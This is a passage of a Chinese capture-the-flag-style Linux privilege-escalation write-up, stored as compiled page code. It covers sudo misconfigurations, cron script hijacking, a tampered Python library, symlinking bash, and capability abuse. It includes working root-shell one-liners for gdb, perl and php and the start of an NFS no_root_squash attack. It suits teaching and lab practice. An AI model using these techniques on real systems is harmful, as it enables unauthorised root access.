"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br")])]),a("p",[s._v("可以sudoers文件主要有三部分组成：")]),s._v(" "),a("ul",[a("li",[s._v("sudoers的默认配置（default），主要设置sudo的一些缺省值\n"),a("ul",[a("li",[s._v("注意"),a("code",[s._v("Defaults secure_path")]),s._v("指定了sudo的PATH变量，这将会覆盖上下文的PATH")])])]),s._v(" "),a("li",[s._v("alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。")]),s._v(" "),a("li",[s._v("安全策略（规则定义）——"),a("strong",[s._v("重点")]),s._v("。")])]),s._v(" "),a("p",[s._v("值得注意的是，sudoer配置文件权限需为"),a("code",[s._v("440")]),s._v("否则无法执行，所以在修改完配置文件和需要将文件权限恢复到440")]),s._v(" "),a("p",[s._v("下面是一些安全规则的语法示例")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("root ALL=(ALL:ALL) ALL\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("root用户可以从  ALL终端作为  ALL（任意）用户 ALL（任意）用户组执行，并运行  ALL（任意）命令。")]),s._v(" "),a("blockquote",[a("p",[s._v("第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户，第四部分是可以充当的用户组（可以省略），最后一部分是他在使用sudo时可以运行的命令。")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("campus ALL = (root) NOPASSWD:/usr/bin/find\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("上面的命令，使用户可以从任何终端运行，以"),a("strong",[s._v("root")]),s._v("用户身份运行命令"),a("code",[s._v("find")]),s._v("而无需密码"),a("code",[s._v("NOPASSWD")]),s._v("标识了这一点。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("%sudo   ALL=(ALL:ALL) ALL\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("%表示用户组，该用户组可以从  ALL终端作为  ALL（任意）用户 ALL（任意）用户组执行，并运行  ALL（任意）命令。")]),s._v(" "),a("h3",{attrs:{id:"提权过程-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#提权过程-2"}},[s._v("#")]),s._v(" 提权过程")]),s._v(" "),a("p",[s._v("那么我们来看lucas用户的"),a("code",[s._v("sudo -l")])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_24f2116eae42343d3a6014f49333dbaa.png",alt:""}})]),s._v(" "),a("p",[s._v("发现他有以maria用户身份执行/bin/nano的权限")]),s._v(" "),a("p",[s._v("查一下 https://gtfobins.github.io/gtfobins/nano/#sudo")]),s._v(" "),a("p",[s._v("发现nano可以拿shell")]),s._v(" "),a("p",[s._v("首先 sudo -u maria /bin/nano 进入界面；")]),s._v(" "),a("p",[a("code",[s._v("CRTL+R")]),s._v(" "),a("code",[s._v("CRTL+X")]),s._v("后输入")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_d9e1fdf5c65a47ba18a8e3bed5b77fbd.png",alt:""}})]),s._v(" "),a("p",[s._v("进入maria身份的shell")]),s._v(" "),a("p",[s._v("为了方便，我们也可以直接加个ssh登录公钥")]),s._v(" "),a("p",[s._v("拿到第四个flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_945856f864bc972c4fbdd8a9e5298a1d.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_0x05-利用不安全的服务-定时任务提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x05-利用不安全的服务-定时任务提权"}},[s._v("#")]),s._v(" 0x05 利用不安全的服务/定时任务提权")]),s._v(" "),a("p",[s._v("我们知道服务也是通过用户启动的，具有进程发起者的权限，如果服务或者定时任务存在漏洞导致攻击者getshell的话，那么攻击者拿到的shell的权限就是服务用户的权限了")]),s._v(" "),a("p",[s._v("服务的话一般直接"),a("code",[s._v("ps aux")]),s._v("枚举进程就能看见，定时任务可能不一定能够及时发现。这里通过pspy来进行Linux监控，项目地址如下：")]),s._v(" "),a("p",[s._v("https://github.com/DominicBreuker/pspy")]),s._v(" "),a("p",[a("code",[s._v("uname -a")]),s._v("可知操作系统是64位的")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_1690c17b62f419b9481ec567e3d24cae.png",alt:""}})]),s._v(" "),a("p",[s._v("下载pspy64并监控")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_c7e19204d91610ab0a9b2b6b9a55c781.png",alt:""}})]),s._v(" "),a("p",[s._v("注意到laura的Server_Status.py和pedro的Reporting_System.sh都会定时自动执行")]),s._v(" "),a("p",[s._v("但是我们目前还看不了laura\n"),a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_33a4998a173674ac08847a4fdf0c7de8.png",alt:""}})]),s._v(" "),a("p",[s._v("查看Reporting_System.sh权限信息")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_16189ec0e944cf85c3fbd9e161750c67.png",alt:""}})]),s._v(" "),a("p",[s._v("发现除了三组rwx最后还多了个+号，这代表着其具有额外的ACL权限")]),s._v(" "),a("blockquote",[a("p",[s._v("什么是ACL\nACL的全称是 Access Control List (访问控制列表) ，一个针对文件/目录的访问控制列表。它在传统的UGO权限管理的基础上为文件系统提供一个额外的、更灵活的权限管理机制。ACL允许你给任何的用户或用户组设置任何文件/目录的访问权限。")])]),s._v(" "),a("p",[s._v("可以通过"),a("code",[s._v("setfacl")]),s._v("和"),a("code",[s._v("getfacl")]),s._v("设置和查看其acl权限")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("getfacl /home/pedro/Reporting_System_Info.sh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("发现maira是有权限读的")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_8b5eb6012618706b914f22ff34688956.png",alt:""}})]),s._v(" "),a("p",[s._v("内容如下")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#!/bin/sh\n\n#Checking system files rights\nls -la /etc/passwd >> /tmp/results.txt\nls -la /etc/shadow >> /tmp/results.txt\n\necho "" >> /tmp/results.txt\n\n#Checking users last login\nlast marvin | head -n 1 >> /tmp/results.txt\nlast lucas | head -n 1 >> /tmp/results.txt\nlast maria | head -n 1 >> /tmp/results.txt\nlast pedro | head -n 1 >> /tmp/results.txt\nlast root | head -n 1 >> /tmp/results.txt\n\necho "" >> /tmp/results.txt\n\n#Checking users groups\nid marvin | cut -d " " -f 3 >> /tmp/results.txt\nid lucas | cut -d " " -f 3 >> /tmp/results.txt\nid maria | cut -d " " -f 3 >> /tmp/results.txt\nid pedro | cut -d " " -f 3 >> /tmp/results.txt\nid root | cut -d " " -f 3 >> /tmp/results.txt\n\n#---\x3e Maria needs to create this feature in the future <---\n#Sending a Email with the results\nsh /home/maria/Send_Reporting_Email.sh 2>/dev/null\n\n#Removing reporting file\nrm -rf /tmp/results.txt\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br")])]),a("p",[s._v("这里调用了maria可控的"),a("code",[s._v("/home/maria/Send_Reporting_Email.sh")]),s._v("的脚本")]),s._v(" "),a("p",[s._v("那么我们劫持这个脚本注入反弹shell命令或者直接写入公钥就可以拿到pedro的shell了")]),s._v(" "),a("p",[s._v("可以监控到执行了我们的命令\n"),a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_5d924e829f5f617e833ae25cd278179e.png",alt:""}})]),s._v(" "),a("p",[s._v("拿到第五个flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_1b3e674d5bda92c6fa132aeb9e543a5b.png",alt:""}})]),s._v(" "),a("p",[s._v("这个时候我们去看Server_Status的权限，发现也是存在acl的，表明pedro用户有权限读取和执行这个应用程序")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_4a3faae34137409e8b953070ad088fc6.png",alt:""}})]),s._v(" "),a("p",[s._v("我们先来看一下脚本的内容")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" os\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" subprocess\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("is_service_running")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("name"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("with")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("os"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("devnull"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'wb'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("as")]),s._v(" hide_output"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        exit_code "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" subprocess"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Popen"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'service'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" name"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'status'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" stdout"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("hide_output"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" stderr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("hide_output"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("wait"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" exit_code "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\n\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("not")]),s._v(" is_service_running"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ssh'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SSH: is not running'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SSH: is running'")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("not")]),s._v(" is_service_running"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'nginx'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Nginx: is not running'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Nginx: is running'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("p",[s._v("乍一看好像没啥可控点和漏洞，但是和之前我们利用"),a("code",[s._v("Send_Reporting_Email.sh")]),s._v("的思路一致，我们可以去看看引入的文件是否可控")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_98804c3b497016b157fff4af722b6c1f.png",alt:""}})]),s._v(" "),a("p",[s._v("我们发现引入的subprocess文件是"),a("code",[s._v("/usr/lib/python2.7/subprocess.py")]),s._v("，查看权限发现他对任意用户可读可写，")]),s._v(" "),a("p",[s._v("读取发现这个subprocess被人修改过\n"),a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_8fa083a3803ee77bb6d12a10e39d599f.png",alt:""}})]),s._v(" "),a("p",[s._v("那么我们尝试把他的key换成我们自己的,做一些修改")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_745d5aa4e5850aa5b0d336d8f255aaa9.png",alt:""}})]),s._v(" "),a("p",[s._v("当pspy监控到运行Server_Status.py时")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_a780934a1a7ed75ad69821bd5a3fd5de.png",alt:""}})]),s._v(" "),a("p",[s._v("我们的key被成功添加了，登录ssh拿到第6个flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_40fd4a22a1f8f8690370d4fd5fe4bf6d.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_0x06-不安全的sudo配置导致的提权之二"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x06-不安全的sudo配置导致的提权之二"}},[s._v("#")]),s._v(" 0x06 不安全的sudo配置导致的提权之二")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("sudo -l\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_e433671e4cc1015a5e8119474c81fbd1.png",alt:""}})]),s._v(" "),a("p",[s._v("发现laura可以以root身份无密码运行 /home/laura/test")]),s._v(" "),a("p",[s._v("但是目录下面并没有test")]),s._v(" "),a("p",[s._v("这个时候我们把/bin/bash给软连接或者拷贝过来")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("ln -s /bin/bash /home/laura/test\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("会发现我们可以sudo运行这个test导致了提权，这也是sudo的一个逻辑缺陷，sudo配置只关心程序的路径，而不关心程序是否会被修改。当然在大多数情况下，比如/usr/bin/find都是不可修改的只可以执行的，不会出现问题，而当错误配置时，就会引发这个逻辑漏洞导致提权")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_1884182da88b48baff17b5e2e00f4e24.png",alt:""}})]),s._v(" "),a("p",[s._v("拿到最后一个flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_b0834c1204714957323a3d8edbad06ba.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_0x07-其他提权方式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x07-其他提权方式"}},[s._v("#")]),s._v(" 0x07 其他提权方式")]),s._v(" "),a("p",[s._v("除了靶机中遇到的这些提权方式，事实上还有一些比较常见的linux提取技巧，在此处继续做一个整理")]),s._v(" "),a("h3",{attrs:{id:"配置不当的capbility导致的提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#配置不当的capbility导致的提权"}},[s._v("#")]),s._v(" 配置不当的Capbility导致的提权")]),s._v(" "),a("h4",{attrs:{id:"什么是capbility"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#什么是capbility"}},[s._v("#")]),s._v(" 什么是Capbility")]),s._v(" "),a("p",[s._v("之前在讲SUID权限的时候我们发现，只要具有SUID，程序就能获得所有者的所有权限，一旦程序被发现有漏洞，比如我们之前演示的"),a("code",[s._v("find")]),s._v(",就能造成提权。而在大多数情况下，比如"),a("code",[s._v("/usr/bin/passwd")]),s._v("程序,我们可能只需要让他有写文件的权限，而不希望他有其他权限。为例更细粒度的对文件权限进行控制，Linux内核自2.2 引入了 capabilities 机制对 root 权限进行细粒度的控制，实现按需授权，从而减小系统的安全攻击面。")]),s._v(" "),a("p",[s._v("举个例子，安装wireshark软件后，默认情况下，普通用户无法对网卡实施抓包操作。这是因为普通用户不具备相应的权限。")]),s._v(" "),a("p",[s._v("为解决此问题，可以为/usr/bin/dumpcap文件授予抓包相关的capabilities：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("命令执行后重新启动wireshark，就可以抓包了。")]),s._v(" "),a("p",[s._v("设置文件Capablity")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("setcap cap_setuid+ep /usr/bin/gdb\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("查看文件的Capability")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("getcap /usr/bin/dumpcap  //查看文件的capabilities\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("删除文件的capabilities")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("setcap -r /usr/bin/dumpcap\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("利用下面命令可以找一些被设置了capability的文件")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("getcap -r / 2>/dev/null\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("类似SUID提权，我们可以通过有特殊capability权限的程序提权，比如下列是通过cap_setuid权限进行提权")]),s._v(" "),a("ol",[a("li",[s._v("gdb")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("ol",{attrs:{start:"2"}},[a("li",[s._v("perl")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("ol",{attrs:{start:"3"}},[a("li",[s._v("php")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("php -r \"posix_setuid(0); system('/bin/sh');\"\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"配置不当的nfs导致的提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#配置不当的nfs导致的提权"}},[s._v("#")]),s._v(" 配置不当的NFS导致的提权")]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("什么是NFS？")]),s._v("\n网络文件系统（"),a("strong",[s._v("NFS")]),s._v("）是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在  "),a("strong",[s._v("NFS")]),s._v("  协议是几个分布式文件系统标准，网络附加存储（NAS）之一。\nNFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。")])]),s._v(" "),a("p",[s._v("简单来说，我们可以透过nfs将一个远程服务器的文件系统挂载到本地，不安全的nfs配置文件如下")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_c8e18abed2e7ff78da5f2c901f1c9ff3.png",alt:""}})]),s._v(" "),a("ul",[a("li",[a("p",[s._v("第一列表示要共享的文件系统挂载点")])]),s._v(" "),a("li",[a("p",[s._v("第二列表示要共享的对象，这里是192.168.111.0/24整个子网")])]),s._v(" "),a("li",[a("p",[s._v("括号中的对象表示各种权限")]),s._v(" "),a("ul",[a("li",[s._v("rw：读写操作")]),s._v(" "),a("li",[s._v("sync: 在应用之前将任何更改写入光盘")]),s._v(" "),a("li",[s._v("no_subtree_check：阻止子树检查")]),s._v(" "),a("li",[a("strong",[s._v("no_root_sqaush")]),s._v("： h:登入 NFS 主机使用分享目录的使用者，如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限！这也是我们提权的利用关键")])])])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("什么是no_root_sqaush？")]),s._v("\n和"),a("code",[s._v("root_sqaush")]),s._v("缺省参数对应，"),a("code",[s._v("root_sqaush")]),s._v("会阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户"),a("code",[s._v("nfsnobody")]),s._v("，它具有最少的本地特权。如果"),a("code",[s._v("no_root_squash")]),s._v("选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用"),a("code",[s._v("root_squash*")]),s._v("参数。")])]),s._v(" "),a("h4",{attrs:{id:"利用nfs并获取root-shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用nfs并获取root-shell"}},[s._v("#")]),s._v(" 利用NFS并获取Root Shell")]),s._v(" "),a("p",[s._v("首先在攻击机上安装连接所需的基础组件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" nfs-common cifs-utils\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("创建目录以挂载远程系统。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" /nfs_client\n")])]),s._v(" 